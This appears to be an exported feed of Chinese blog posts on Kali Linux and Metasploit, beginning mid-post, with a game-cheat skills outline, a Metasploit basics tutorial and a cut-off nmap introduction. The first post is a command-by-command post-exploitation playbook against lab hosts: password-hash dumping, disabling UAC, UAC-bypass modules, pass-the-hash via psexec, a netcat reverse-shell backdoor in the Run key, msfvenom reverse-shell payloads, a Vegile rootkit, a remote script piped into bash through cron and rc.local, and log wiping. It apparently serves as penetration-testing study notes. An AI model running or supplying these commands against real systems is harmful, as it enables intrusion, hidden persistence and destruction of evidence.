可能会出现操作受限的情况，所以我们使用主机的账户信息建立 session 进行连接。</p><p>Windows System32 config SAM</p><p>我们创建一条防火墙规则允许4444 端口访问网络，否则我们建立 session 时 payload 不能通过4444 端口访问网络导致 session 建立失败。</p><p>netsh firewall add portopening TCP 4444 “phantom” ENABLE ALL</p><p>账号的hash值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">admin:1003:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="meta">HomeGroupUser$</span><span class="bash">:1002:aad3b435b51404eeaad3b435b51404ee:381c848b3c04bb3cb5eb508e52e39d8c:::</span></span><br><span class="line">phantom:1005:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">win7 x64:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure><p>C:\Windows\system32&gt;cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\windows\Currentversion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\windows\Currentversion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f<br>The operation completed successfully.</p><p>参数说明<br>ADD添加一个注册表项<br>-v 创建键值<br>-t 键值类型<br>-d 键值的值<br>-f 强制修改注册表项</p><p>开启 win7 系统主机的默认共享， 默认共享对 Windows 主机的文件共享非常方便，也方便黑客利用这个功能，远程执行命令。<br>C:Windows system32&gt; cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</p><p><strong>注：</strong>psexec 实用程序在远程系统上需要做一些事情：服务器消息块（ SMB ）服务必须可用并且可以访问（例如，未被防火墙阻止）；必须启用文件和打印共享。 Admin$ 共享必须可用并且可以访问。它是一个隐藏的 SMB 共 享， 它映射到 Windows 目录，用于软件部署。提供给 psexec 实用程序的凭据必须具有访问 Admin$ 共享的权限。 psexec 的可执行文件内有 Windows 服务映像。它接受此服务并将其部署到远程计算机上的Admin$ 共享中。然后，它使用 SMB 上的 DCE/RPC 分布式计算环境 远程过程调用 ）接口来访问 W indows Service Control Manager API 。它将打开远程计算机上的 psexec服务。然后 psexec 服务创建一个可用于将命令发送到系统的命名管道。</p><h1 id="注：提权-绕过UAC"><a href="#注：提权-绕过UAC" class="headerlink" title="注：提权 绕过UAC"></a>注：提权 绕过UAC</h1><p>当我们得到一个目标主机返回的shell后，我们第一步要看的是当前用户是不是管理员权限，如果不是管理员权限，这个时候需要我们去提权。我们可以利用kaili中的本地提权的方式，下面介绍一下本地提权绕过UAC的方式提升当前用户权限，以下是详细的命令以及步骤：</p><p><strong>什么是UAC</strong></p><p>Microsoft的Windows Vista和Windows Server 2008操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。</p><p><strong>UAC如何运行</strong></p><p>UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。</p><p>因为有的用户是没有管理员权限，没有管理员权限是运行不了哪些只能通过管理员权限才能操作的命令。比如修改注册表信息、创建用户、读取管理员账户密码、设置计划任务添加到开机启动项等操作。</p><p>最直接的就是 getsystem</p><p>绕过UAC防护机制的前提是我们首先通过explloit获得目标主机的meterprter</p><p>执行完毕成功后，再次查询当前用户的权限就会提升到管理员权限 getuid</p><h3 id="1-进程注入"><a href="#1-进程注入" class="headerlink" title="1.进程注入"></a>1.进程注入</h3><p>use exploit/windows/local/bypassuac</p><h3 id="2-内存注入"><a href="#2-内存注入" class="headerlink" title="2.内存注入"></a>2.内存注入</h3><p>此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。执行完毕以下命令，当前用户权限就会变为管理员权限</p><p>use exploit/windows/local/bypassuac_fodhelper</p><h3 id="3-通过COM处理程序劫持"><a href="#3-通过COM处理程序劫持" class="headerlink" title="3.通过COM处理程序劫持"></a>3.通过COM处理程序劫持</h3><p>COM处理程序劫持，此模块将通过在<strong>hkcu配置单元中创建COM处理程序注册表</strong>项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项。这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果cmd.exe访问受到限制，此模块将无法正常运行。</p><p>use exploit/windows/local/bypassuac_comhijack</p><h3 id="4-通过Eventvwr注册表项"><a href="#4-通过Eventvwr注册表项" class="headerlink" title="4.通过Eventvwr注册表项"></a>4.通过Eventvwr注册表项</h3><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）</p><p>use exploit/windows/local/bypassuac_eventvwr</p><p>以上的本地提权的模块大家可以本地去测试一下，除了这些某块还有其它的通过直接通过incognito中的add_localgroup_user提升、ms13-081、ms15-051、ms16-032、MS16-016、MS14-068、ms18_8120_win32k_privesc域权限提升等其它的权限提升方法</p><h2 id="1-3-使用-hash-值登录系统"><a href="#1-3-使用-hash-值登录系统" class="headerlink" title="1.3.使用 hash 值登录系统"></a>1.3.使用 hash 值登录系统</h2><hr><p>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <code>use exploit/windows/smb/psexec</code><br>[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp<br>msf6 exploit(windows/smb/psexec) &gt; <code>set payload windows/meterpreter/reverse_tcp</code></p><p>msf6 exploit(windows/smb/psexec) &gt; <code>set RHOSTS 192.168.3.28</code></p><p>msf6 exploit(windows/smb/psexec) &gt; <code>set SMBUSER phantom</code></p><p>msf6 exploit(windows/smb/psexec) &gt; <code>set SMBPASS aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</code></p><p>msf6 exploit(windows/smb/psexec) &gt;<code> set SMBDOMAIN WORKGROUP</code><br>SMBDOMAIN =&gt; WORKGROUP<br>msf6 exploit(windows/smb/psexec) &gt; <code>exploit</code></p><hr><p>我们用phantom获取了system的权限</p><p><code>getuid</code></p><p><code>Server username: NT AUTHORITY\SYSTEM</code></p><p>下面我们配置一个后门程序，修改UAC 的注册表，需要重启才能生效。<br>上传nc 到 Win 7<br><code>meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows</code></p><p>注册表添加启动项执行<br><strong>nc 反弹 shell 命令</strong><br><code>meterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#39;C:\windows\nc.exe -Ldp 443 -e cmd.exe&#39;</code><br><code>Successfully set lltest_nc of REG_SZ.</code><br>nc 参数解释：<br>-L表示用户退出连接后重新进行端口侦听<br>-d后台运行<br>-p指定端口<br>-e prog 程序重定向，一旦连接，就执行<br>meterpreter &gt; shell</p><p><code>C:\Windows\system32&gt;netsh firewall add portopening TCP 443 &quot;phantom&quot; ENABLE ALL</code></p><p>shutdown -r -f -t 0</p><p>-r 重启</p><p>-f 强制</p><p>-t 时间 0 表示立刻</p><p><strong>后门已经插入 用nc 连接或者msf</strong></p><p>nc -v 192.168.3.28 443</p><p>msf6 &gt; connect 192.168.3.28 443</p><p>还可以上传木马并执行</p><h1 id="3-Linux无文件木马程序"><a href="#3-Linux无文件木马程序" class="headerlink" title="3.Linux无文件木马程序"></a>3.Linux无文件木马程序</h1><p><code>准备 </code></p><p>Ubuntu：192.168.3.26</p><p>kali: 192.168.3.24</p><p>root@kali:~# msfvenom -a x64 –platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.3.24 LPORT=8080 -b “\x00” -f elf -o /var/www/html/backdoor</p><p>msfvenom -a x64 –platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.3.24 LPORT=4444 -b “\x00” -f elf -o /var/www/html/ghost</p><p>启动apache<br>systemctl start apache2</p><p>systemctl enable apache2 开机自启</p><p>Vegile<br>是用于 linux 系统渗透测试中的权限维持。 Vegile 这个工具将设置一个后门 /rootkit ，并且<br>这个后门会直接隐藏进程，无限连接 metesploit, 持续维持你的 Metepreter 会话，即使木马进程被杀<br>死，它依然会再次重新运行，换句话说是该进程无限循环的。</p><p>使用注意事项：<br>木马一定要放在Vegile 目录下<br>Vegile一般用于维持 meterpreter 会话；</p><blockquote><p>use exploit/multi/handler<br>exploit(multi/handler) &gt; set payload linux/x64/shell/reverse_tcp<br>exploit(multi/handler) &gt; set LHOST 192.168.3.24<br>exploit(multi/ha ndler) &gt; set LPORT 8080 改一下端口，防止和上面实验的 4444 端端口冲突</p><p>exploit(multi/ha ndler) &gt;  exploit -j</p></blockquote><p>到Ubuntu下建立连接</p><p>将Vegile 和backdoor传入</p><p>wget 192.168.3.24/backdoor</p><p>chmod +x backdoor</p><p>chmod +x Vegile</p><p>./backdoor</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msfm.png"></p><p> netstat -antup | grep 8080</p><p>ps -aux | grep 4495</p><p>ifconfig</p><p>/usr/sbin/ifconfig</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf1/m2.png"></p><h2 id="3-2-创建无文件后门程序"><a href="#3-2-创建无文件后门程序" class="headerlink" title="3.2 创建无文件后门程序"></a>3.2 创建无文件后门程序</h2><blockquote><p>use exploit/multi/handler<br>exploit(multi/handler) &gt; set payload linux/x64/shell/reverse_tcp<br>exploit(multi/handler) &gt; set LHOST 192.168.3.24<br>exploit(multi/handler) &gt; set LPORT 4444<br>exploit(multi/handler) &gt; exploit -j</p></blockquote><p>在kali上操控Ubuntu</p><p>wget 192.168.3.24/ghost</p><p>chmod +x ghost</p><p>./Vegile –i ghost</p><p>查看已成功</p><p>sessions 查看端口为37884</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf1/m3.png"></p><p>rm -rf /root/Vegile master</p><p>删除时会把后门给删掉，但通话还建立，程序照常运行</p><p><code>./Velige --u 无限复制metasploit会话，即使kill 任然可以运行</code></p><p><code>./Velige --i ghost</code></p><h1 id="4-使用脚本来进行自动创建后门"><a href="#4-使用脚本来进行自动创建后门" class="headerlink" title="4.使用脚本来进行自动创建后门"></a>4.使用脚本来进行自动创建后门</h1><p><strong>建立个脚本</strong></p><p><code>vim script.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 把前面下载 Vegile 到执行后门文件的命令使用 拼接成一条命令</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&amp;&amp; 表示前面的命令执行成功则执行下一条命令</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> y | 表示将 y 作为 Vegile 命令的输入，因为执行 Vegile 命令是需要我们按任意键退出，所以我们手动输入一个字符让程序执行完成后自动退出。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&gt;&gt; /dev/null 2&gt;&amp;1 不显示所有输出结果。</span></span><br><span class="line">wget 192.168.3.24/Vegile-master.zip &amp;&amp; unzip Vegile-master.zip &amp;&amp; cd Vegile master &amp;&amp; chmod +x Vegile &amp;&amp; wget 192.168.3.24/ghost &amp;&amp; chmod +x ghost &amp;&amp; echo -y | ./Vegile --i ghost &gt;&gt; /dev/null 2&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash">删除下载的所有文件</span></span><br><span class="line">rm -rf /tmp/Vegile master.zip /tmp/Vegile master</span><br><span class="line"><span class="meta">2&gt;</span><span class="bash">&amp;1的意思就是将标准错误重定向到标准输出。这里标准输出已经重定向到了/dev/null 。那么</span></span><br><span class="line">标准错误也会输出到 /dev/null 。 /dev/null 可以看作黑洞. 它等价于一个只写文件.所有写入它的内容都会永远丢失.而尝试从它那儿读取内容则什么也读不到</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先我们先清空后台任务和前面已经建立的session<br>msf6 exploit(multi/handler) &gt; jobs -K<br>msf6 exploit(multi/handler) &gt; sessions -K<br>msf6 exploit(multi/handler) &gt; exploit -j</p><blockquote><p>bash &lt;(curl -s -L <a href="http://192.168.3.24/script.sh">http://192.168.3.24/script.sh</a>) &gt;&gt; /dev/null 2&gt;&amp;1</p></blockquote><hr><p>说明：<br>bash&lt;() 表示将括号中的内容通过 bash 来执行<br>curl -s -L #curl 是一个利用 URL 语法在命令行下进行文件传输的工具<br>-s –silent 表示静默模式不输出任何内容<br>-L 跟 http 连接，组合使用的效果是把 http 连接中的文件下载到内存中，然后传 bash ，进行执行。这样好处是：本地不会保存任何文件。</p><p>&gt;&gt;/dev/null 2&gt;&amp;1不输出任何信息</p><hr><p>sessions连接已建立</p><p>pwd</p><p>pwd: error retrieving current directory: getcwd: cannot access parent directories: No<br>such file or directory</p><p>提示目录不存在因为payload中的Velige目录已被删除</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h2 id="配置开机自启"><a href="#配置开机自启" class="headerlink" title="配置开机自启"></a>配置开机自启</h2><p>将命令添加到开机启动项</p><p>注： 在开机项加/etc/rc.local</p><p><code>root@Ububtu:~# echo &quot;bash &lt;(curl -s -L http://192.168.3.24/script.sh) &gt;&gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /etc/rc.local</code></p><p><code>chmod +x /etc/rc.local</code></p><p>reboot</p><p><strong>？上面的试了没用</strong></p><p>root@ubuntu:<del># mv /etc/rc.local /etc/init.d/<br>root@ubuntu:</del># cd /etc/init.d<br>root@ubuntu:/etc/init.d# su update-rc.d rc.local defaults 99</p><h2 id="配置计划任务"><a href="#配置计划任务" class="headerlink" title="配置计划任务"></a>配置计划任务</h2><p>ll /etc/crontab</p><p>这是系统任务调度文件</p><p>vim /etc/crontab</p><p>SHELL=/bin/bash</p><p>PATH=/sbin:/bin:/usr/sbin:/usr/bin #系统搜索路径</p><p>MAILTO=root</p><p># * * * * * user</p><p>name command to be executed<br>0 */1 * * * root bash &lt;(curl s L <a href="http://192.168.1.53/xuegod.sh">http://192.168.1.53/xuegod.sh</a>) &gt;&gt; /dev/null 2&gt;&amp;1</p><h1 id="系统日志清理"><a href="#系统日志清理" class="headerlink" title="系统日志清理"></a>系统日志清理</h1><h2 id="Windows-日志清理"><a href="#Windows-日志清理" class="headerlink" title="Windows 日志清理"></a>Windows 日志清理</h2><p>Win+R 运行： eventvwr</p><p>正常的远程访问在 windows 的时间查看器中可以看到相关记录</p><p>meterpreter &gt; clearev</p><p>删除系统日志目录下的一些日志文件。<br>meterpreter &gt; shell<br>C:\Windows system32&gt;del %WINDIR% WINDIR%\*.log /a/s/q/f</p><h2 id="Linux-日志清理"><a href="#Linux-日志清理" class="headerlink" title="Linux 日志清理"></a>Linux 日志清理</h2><p>Linux<br>可能根据发行版本不同，日志文件名称也有所不同。所以具体清除需要大家先看一下目标操作<br>系统。<br>清理历史命令<br>history -c<br>使系统不再保存历史命令<br>vi /etc/profile，找到 HISTSIZE 这个值，修改为 0<br>删除访问日志</p><p><strong>访问失败的日志</strong></p><p>删除登录失败记录：echo &gt; /var/log/btmp<br><strong>访问成功的日志</strong><br>echo &gt; /var/log/wtmp （此时执行 last 命令就会发现没有记录）<br><strong>删除日志记录</strong>：</p><p> echo &gt; /var/log/secure</p><p><strong>执行时注意文件是否有执行权限。而且删除日志一般只有root 权限才可以。</strong></p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali，msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游戏安全</title>
      <link href="/2021/07/16/Re/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/"/>
      <url>/2021/07/16/Re/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="游戏外挂"><a href="#游戏外挂" class="headerlink" title="游戏外挂"></a>游戏外挂</h1><p>1.过保护 TP/NP/BE/GDK/X3</p><p>2.数据分析 属性/call/漏洞</p><p>3.研发 外挂代码逻辑</p><p>4.过检测 模块检测，数据检测，CRC检测，封包检测，堆栈检测，文件检测，特征检测</p><p><strong>开发</strong></p><p>编程语言，c++/易语言</p><p>系统编程 Win32 api PE结构</p><p>界面编程 MFC QT 易语言</p><p>+-安全技能</p><p>软件逆向 数据分析 漏洞挖掘</p><p>内核安全 保护模式 调试与异常 驱动研发 VT硬件虚拟化</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit渗透测试框架的基本使用</title>
      <link href="/2021/07/16/Linux%E5%AD%A6%E4%B9%A0/kali/msf/"/>
      <url>/2021/07/16/Linux%E5%AD%A6%E4%B9%A0/kali/msf/</url>
      
        <content type="html"><![CDATA[<h1 id="metasploit-渗透测试框架介绍"><a href="#metasploit-渗透测试框架介绍" class="headerlink" title="metasploit 渗透测试框架介绍"></a>metasploit 渗透测试框架介绍</h1><p>1.基础库： metasploit 基础库文件位于源码根目录路径下的 libraries 目录中，包括<br>Rex,framework core 和 framework base 三部分。</p><p>2.模块：模块组织按照不同的用途分为 6 种类型的模块（ Modules<br>分为辅助模块（Aux）、渗透攻击模块（ Exploits) 、后渗透攻击模块（ Post) 、攻击载荷模块<br>payloads) 、编码器模块（ Encoders) 、空指令模块（ Nops) 。</p><p>3.插件：插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如Nessus 、 OpenVAS 漏洞扫描器等，为用户接口提供一些新的功能。</p><p>4.接口：包括 msfconsole 控制终端、 msfcli 命令行、 msfgui 图形化界面、 armitage 图形化界<br>面以及 msfapi 远程调用接口。</p><p>5.功能程序： metasploit 还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快<br>速地利用 metasploit 框架内部能力完成一些特定任务。比如 msfpayload 、 msfencode 和<br>msfvenom 可以将攻击载荷封装为可执行文件、 C 语言、 JavaScript 语言等多种形式，并可以进行各种<br>类型的编码。</p><p>Metasploit程序需要使用 Postgresql 数据库。<br>PostgreSQL是一种特性非常齐全的自由软件的对象 关系型数据库管理系统（ ORDBMS ），是以加州大学计算机系开发的 POSTGRES 4.2 版本为基础的对象关系型数据库管理系统。</p><p>Core Commands<br>核心命令<br>Module Commands<br>模块命令<br>Job Commands<br>后台任务命令<br>Resource Script Commands<br>资源脚本命令<br>Database Backend Commands<br>数据库后端命令<br>Credentials Backend Commands<br>证书 凭证后端命令<br>Developer Commands<br>开发人员命令</p><p>1.核心命令中的 connect 命令</p><p>connect 命令主要用于远程连接主机。一般用于内网渗透。比较常用的命令就是“ connect<br>19 2.168.1.1 80</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msfmsf.png" alt="connect"></p><p>2.模块相关的命令 show 使用方法<br>show命令用的很多。<br>有效参数是 all, encoders, nops, exploits, payloads, auxiliary, post，plugins, info, options<br>例1 ：列出 metasploit 框架中的 所有渗透攻击模块 exploits 。<br>msf6 &gt; show exploits</p><p>3.模块相关的命令 search 搜索的使用方法</p><h1 id="matesploit-framework功能"><a href="#matesploit-framework功能" class="headerlink" title="matesploit framework功能"></a>matesploit framework功能</h1><ul><li><p>信息搜集</p></li><li><p>漏洞探测</p></li><li><p>漏洞利用</p></li><li><p>权限提升</p></li><li><p>内网渗透</p></li><li><p>权限维持</p></li><li><p>痕迹清除</p></li></ul><h2 id="ms17-010漏洞复现"><a href="#ms17-010漏洞复现" class="headerlink" title="ms17_010漏洞复现"></a>ms17_010漏洞复现</h2><p><strong>1&gt;模块相关的命令 use 的使用方法</strong><br>use使用参数。如你要使用到某个模块，就要使用到 use 命令</p><p>search ms17_010</p><p>use ms17_010</p><p>info</p><p>从弹出的消息中，需要重点关注的内容是：</p><p>1.可用目标 就是查看可以攻击哪些操作系统</p><p>2.Basic options: 调用 漏洞 需要的相关参数</p><p>3.漏洞 描述和执行过程： </p><p>4.参考文档</p><p><strong>2&gt;.使用 show 命令查看模块的相关信息</strong></p><p>show options 查看模块的选项</p><p>mb/ms08_067_netapi) &gt; show targets 查看可以攻击哪些操作系统</p><p>设置RHOSTS 参数，指定攻击的目标机器<br>set RHOSTS 192.168.3.28</p><p>search windows/x64/shell type:payload</p><p>set payload 名字</p><p>net user admin admin /add</p><p>chcp 65001</p><p>net user</p><p>exploit -j 表示后台执行</p><p>session -i 2</p><p>background 转移到后台</p><p>sessions</p><p>sessions -k 2 结束会话</p><p><strong>总结使用</strong><br>metasploit 攻击的步骤：<br>1.查找 CVE 公布的漏洞<br>2.查找对应的 exploit 模块<br>3.配置模块参数<br>4.添加 payload 后门<br>5.执行 exploit 开始攻击</p><h2 id="msf扫描靶机上的mysql服务的空密码"><a href="#msf扫描靶机上的mysql服务的空密码" class="headerlink" title="msf扫描靶机上的mysql服务的空密码"></a>msf扫描靶机上的mysql服务的空密码</h2><p>登录Metasploitable2 Linux</p><p>msf6 &gt; use auxiliary/scanner/mysql/mysql_login </p><p>msf6 auxiliary(scanner/mysql/mysql_login) &gt; set USERNAME root<br>USERNAME =&gt; root<br>msf6 auxiliary(scanner/mysql/mysql_login) &gt; set BLANK_PASSWORDS true  为所有用户尝试空密码<br>BLANK_PASSWORDS =&gt; true<br>msf6 auxiliary(scanner/mysql/mysql_login) &gt; set RHOSTS 192.168.3.27<br>RHOSTS =&gt; 192.168.3.27</p><p>使用后端凭证命令 creds 列出数据库中的所有凭据<br>Credentials凭证 证书<br>msf6 auxiliary(scanner/mysql/mysql_login) &gt; creds</p><p><strong>数据库后端命令</strong><br>db_connect 连接到现有的数据库<br>db_disconnect 断开与当前数据库实例的连接<br>db_export 导出包含数据库内容的文件<br>db_import 导入扫描结果文件（文件类型将被自动检测）</p><p><strong>将前面扫描 mysql 数据库空密码信息导出</strong><br>msf6 auxiliary(scanner/mysql/mysql_login) &gt; db_export f xml /root/bak.xml</p><p>注：导出只支持两种格式：xml 和 pwdump</p><p>常用的导出格式为xml</p><p>msfdb reinit 重置数据库</p><p>msfconsole 开msf</p><p>db_import /root/bak.xml</p><p>msf6 &gt; hosts</p><p>c 此 选项 使我们能够选择要用 hosts 命令显示的数据的列或字段,类似于 SQL 中的 select 命令,在上图中可以看到显示的可用列。</p><p>msf6 &gt; hosts c address,name,os_name</p><p>删除指定主机<br>msf6 &gt; hosts d 192.168.1.180</p><p>我们还可以直接将<strong>NMAP 的扫描结果导入到 Metasploit 数据库</strong>中我们新开一个终端窗口来进行扫描。</p><p><code>nmap -A baidu.com -oX baidu.xml</code><br>-oX 将扫描信息导出到 XML 文件中</p><p>db_import /root/baidu.xml</p><p>hosts</p><p>services</p><p>msf6 &gt; services -R 39.156.69.76</p><h1 id="msf-命令"><a href="#msf-命令" class="headerlink" title="msf 命令"></a>msf 命令</h1><p>msf6 &gt; help</p><p><strong>核心命令</strong></p><p>？帮助菜单<br>banner 显示一个 metasploit 横幅<br>cd 更改当前的工作目录<br>color 切换颜色<br>connect 连接与主机通信<br>exit 退出控制台<br>get 获取特定于上下文的变量的值<br>getg 获取全局变量的值<br>grep grep 另一个命令的输出 如： grep creds help<br>help 帮助菜单<br>history 显示命令历史<br>irb 进入 irb 脚本模式<br>load 加载一个框架插件<br>quit 退出控制台<br>route 通过会话路由流量<br>save 保存活动的数据存储<br>sessions 转储会话列表并显示有关会话的信息<br>set 将特定于上下文的变量设置为一个值<br>setg 将全局变量设置为一个值<br>sleep 在指定的秒数内不做任何事情<br>spool 将控制台输出写入文件以及屏幕<br>threads 线程查看和操作后台线程<br>unload 卸载框架插件<br>unset 取消设置一个或多个特定于上下文的变量<br>unsetg 取消设置一个或多个全局变量<br>version 显示框架和控制台库版本号<br><strong>模块命令</strong></p><p>advanced 显示一个或多个模块的高级选项<br>back 从当前上下文返回<br>edit 使用首选编辑器编辑当前模块<br>info 显示有关一个或多个模块的信息</p><p>loadpath 路径从路径搜索并加载模块<br>options 显示全局选项或一个或多个模块<br>popm 将最新的模块从堆栈中弹出并使其处于活动状态<br>previous 将之前加载的模块设置为当前模块<br>pushm 将活动或模块列表推入模块堆栈<br>reload_all 从所有定义的模块路径重新加载所有模块<br>search 搜索模块名称和描述<br>show 显示给定类型的模块或所有模块<br>use 按名称选择模块<br><strong>工作命令</strong></p><p>handler 作为作业启动负载处理程序<br>jobs显示和管理作业<br>kill 杀死一个工作</p><p>rename_job 重命名作业</p><p><strong>资源脚本命令</strong></p><p>makerc 保存从开始到文件输入的命令<br>resource 运行存储在文件中的命令</p><p><strong>数据库后端命令</strong></p><p>db_connect 连接到现有的数据库<br>db_disconnect 断开与当前数据库实例的连接<br>db_export 导出包含数据库内容的文件<br>db_import 导入扫描结果文件（文件类型将被自动检测）<br>db_nmap 执行 nmap 并自动记录输出</p><p>db_rebuild_cache 重建数据库存储的模块高速缓存<br>db_status 显示当前的数据库状态<br>hosts 列出数据库中的所有主机<br>loot 列出数据库中的所有战利品<br>notes 列出数据库中的所有笔记<br>services 列出数据库中的所有服务<br>vulns 列出数据库中的所有漏洞<br>workspace 在数据库工作区之间切换</p><p><strong>凭证后端命令</strong></p><p>creds 列出数据库中的所有凭据</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali，msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap的使用技巧&lt;1&gt;</title>
      <link href="/2021/07/15/Linux%E5%AD%A6%E4%B9%A0/kali/nmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/2021/07/15/Linux%E5%AD%A6%E4%B9%A0/kali/nmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p><a href="https://nmap.org/man/zh/index.htm">nmap参考指南</a></p><h1 id="简单介绍nmap"><a href="#简单介绍nmap" class="headerlink" title="简单介绍nmap"></a>简单介绍nmap</h1><p>Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具主机检测工具</p><ul><li><p>检测活在网络上的主机（主机发现）</p></li><li><p>检测主机上开放的端口（端口发现或枚举）</p></li><li><p>检测到相应的端口（服务发现）的软件和版本</p></li><li><p>检测操作系统，硬件地址，以及软件版本</p></li><li><p>检测脆弱性的漏洞（Nmap的脚本）</p></li></ul><p>命令：**<code>nmap</code> [ <em><code>&lt;扫描类型&gt;</code></em> …] [ <em><code>&lt;选项&gt;</code></em> ] { <em><code>&lt;扫描目标说明&gt;</code></em> }**</p><p>#nmap 192.168.3.1 扫描主机 简单扫描 1-1000端口</p><p>#nmap 192.168.3.1 扫描整个子网</p><p>#nmap 可以执行多个目标</p><p>#nmap -sL 192.168.1.1/24如果你想看到你扫描的所有主机的列表</p><p>#nmap -p80,21,23 192.168.1.1  扫描端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap端口状态解析</span><br><span class="line">open： 应用程序在该端口接收 TCP 连接或者 UDP 报文。 </span><br><span class="line">closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</span><br><span class="line">filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</span><br><span class="line">unfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</span><br><span class="line">open| filtered ：无法确定端口是开放还是被过滤， 